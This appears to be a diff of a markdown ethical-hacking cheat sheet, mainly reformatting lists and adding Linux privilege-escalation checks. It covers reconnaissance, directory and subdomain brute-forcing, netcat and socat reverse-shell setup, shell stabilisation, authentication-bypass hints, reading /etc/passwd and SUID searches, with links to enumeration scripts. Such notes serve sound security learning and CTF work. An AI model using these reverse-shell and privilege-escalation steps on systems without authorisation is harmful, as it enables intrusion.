@@ -5,8 +5,8 @@ EHR - Ethical Hacking Repository
 
 ## Passive Information Gathering
 
-1. **whois**: $ whois targetdomain.com
-2. **nslookup**: $ nslookup -type=[T] targetdomain.com [optional-resolver]
+- **whois**: $ whois targetdomain.com
+- **nslookup**: $ nslookup -type=[T] targetdomain.com [optional-resolver]
       
       | [T]   | Result             |
       |-------|--------------------|
@@ -17,16 +17,16 @@ EHR - Ethical Hacking Repository
       | SOA   | Start of Authority |
       | TXT   | TXT Records        |
       
-3. **dig**: $ dig [@optional-resolver] targetdomain.com [T]
-4. **DNSDumpster**
+- **dig**: $ dig [@optional-resolver] targetdomain.com [T]
+- **DNSDumpster**
 
 ## Active Information Gathering
 
 ### Manual Active Inf. G.
 
-1. **ping**: $ ping -n 10 [target_ip]
-2. **traceroute**: $ traceroute [target_ip or domain name]
-3. **telnet**: $ telnet [target_ip] [port]
+- **ping**: $ ping -n 10 [target_ip]
+- **traceroute**: $ traceroute [target_ip or domain name]
+- **telnet**: $ telnet [target_ip] [port]
 
 ### Automated Active Inf. G.
 
@@ -38,11 +38,11 @@ EHR - Ethical Hacking Repository
 
 ### Web Content Discovery
 
-1. Check http:/targetsite.com/robots.txt for hidden folders or files;
-2. Check http:/targetsite.com/sitemap.xml for website architecture and hidden areas;
-3. Check HTTP Response Header fields such as: "Server" (OS and version) and "X-Powered-By" (web langauge version);
-4. Check Framework Stack version and vulnerabilities;
-5. Google Dorking:
+- Check http:/targetsite.com/robots.txt for hidden folders or files;
+- Check http:/targetsite.com/sitemap.xml for website architecture and hidden areas;
+- Check HTTP Response Header fields such as: "Server" (OS and version) and "X-Powered-By" (web langauge version);
+- Check Framework Stack version and vulnerabilities;
+- Google Dorking:
       
       | Filter   | Example             | Description                                      |
       |----------|---------------------|--------------------------------------------------|
@@ -51,7 +51,7 @@ EHR - Ethical Hacking Repository
       | filetype | filetype:pdf        | results which are a particular type of file ext. |
       | intitle  | intitle:admin       | results that contain the specified word in title |
 
-6. Automated Content Discovery:
+- Automated Content Discovery:
 
 ```bash
 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u http:/targetsite.com/ 
@@ -63,11 +63,11 @@ gobuster -u http://targetsite.com -w /usr/share/wordlists/dirbuster/directory-li
 
 ### Subdomain Enumeration
 
-1. Check TLS Certificate;
-2. Serach Engines, to reveal subdomains:
+- Check TLS Certificate;
+- Serach Engines, to reveal subdomains:
       - GOOGLE: -site:www.targetsite.com site:* .targetsite.com
 
-3. DNS Bruteforce:
+- DNS Bruteforce:
            
        dnsrecon -d targetsite.com -D /usr/share/wordlists/dnsmap.txt -t std
 
@@ -93,7 +93,7 @@ But you can also exploit the registration form where the "Username already exist
 
 ## Getting a reverse shell
 
-1. **Netcat**: easy to istantiate but also to lose, requires stabilization:
+- **Netcat**: easy to istantiate but also to lose, requires stabilization:
 
       ```bash
       On target ---
@@ -104,7 +104,7 @@ But you can also exploit the registration form where the "Username already exist
       $ nc -nlvp [listener port]
       ```
 
-2. **Socat**: stronger but harder syntax, rarely installed, provides stabilized shell (Socat binary available [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true))
+- **Socat**: stronger but harder syntax, rarely installed, provides stabilized shell (Socat binary available [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true))
 
       ```bash
       On target ---
@@ -114,7 +114,7 @@ But you can also exploit the registration form where the "Username already exist
       $ socat TCP-L:[port] FILE:`tty`,raw,echo=0
       ```
       
-3. **Metasploit**: sometimes banned from CTF environments
+- **Metasploit**: sometimes banned from CTF environments
 
 All reverse shells are available at [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
@@ -122,25 +122,25 @@ All reverse shells are available at [Reverse Shell Cheat Sheet](https://github.c
 
 ### Python
 
-1. Check Python version and execute the command
+- Check Python version and execute the command
   
        python -c 'import pty;pty.spawn("/bin/bash")'
     
-2. Get access to term commands
+- Get access to term commands
 
        export TERM=xterm
     
-3. Cntrl + Z
+- Cntrl + Z
 
        stty raw -echo; fg 
 
 ### rlwrap
 
-1. Use rlwrap prepended nc command at the listener
+- Use rlwrap prepended nc command at the listener
 
        rlwrap nc -nlvp [port]
 
-2. Cntrl + Z
+- Cntrl + Z
 
        stty raw -echo; fg
 
@@ -148,8 +148,8 @@ All reverse shells are available at [Reverse Shell Cheat Sheet](https://github.c
 
 ### Authenitcation Bypass
 
-1. Always look for .js or .php authentication scripts through Network tab (Advanced Tools F12), BurpSuite or Content Discovery. You could encounter authentication flaws.
-2. Check Cookies, try to decode them
+- Always look for .js or .php authentication scripts through Network tab (Advanced Tools F12), BurpSuite or Content Discovery. You could encounter authentication flaws.
+- Check Cookies, try to decode them
 
 ### Brute Force
 
@@ -181,20 +181,20 @@ Where -fx could be {fc | fw | fr | fl | fs} which are dual with respect to the m
 
 #### Manual Enumeration
 
-1. Hostname: $ hostname
-2. System information: $ uname -a
-3. Processes information: $ cat /proc/version
-4. OS version: $ cat /etc/os-release
-5. Processes List: $ ps aux
-6. Check root privileges on current user: $ sudo -l
-7. User privilege and membership: $ id
-8. Users on the system: $ cat /etc/passwd (Check also if it is writable)
-9. Existing communications: $ netstat -a; $ netstat -ano
-10. Find interesting files:
+- Hostname: $ hostname
+- System information (Kernel Exploiting): $ uname -a
+- Processes information: $ cat /proc/version
+- OS version: $ cat /etc/os-release
+- Processes List: $ ps aux
+- Check root privileges on current user: $ sudo -l
+- User privilege and membership: $ id
+- Users on the system: $ cat /etc/passwd (Check also if it is writable)
+- Existing communications: $ netstat -a; $ netstat -ano
+- Find interesting files:
          
         find / -name flag1.txt 2>/dev/null
          
-11. Find writable or executable folders:
+- Find writable or executable folders:
 
       ```bash
       find / -perm -o w -type d 2>/dev/null
@@ -202,15 +202,25 @@ Where -fx could be {fc | fw | fr | fl | fs} which are dual with respect to the m
       ```bash 
       find / -perm -o x -type d 2>/dev/nul
       ```
-12. Find SUID bit files (Executables with higher privileges):
+- Find SUID bit files (Executables with higher privileges):
 
         find / -perm -u=s -type f 2>/dev/null
+        
+- Check capabilities
+
+        getcap -r / 2>/dev/null
+        
+- Check cronjobs
+
+        cat /etc/crontab
+        
+- Check for writable folders in $PATH
 
 #### Automated Tools
 
-1. [LinPeas](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh)
-2. [Linux Exploit Suggester](https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh)
-3. [LinEnum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)
+- [LinPeas](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh)
+- [Linux Exploit Suggester](https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh)
+- [LinEnum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)
  
 # Exploitation
 
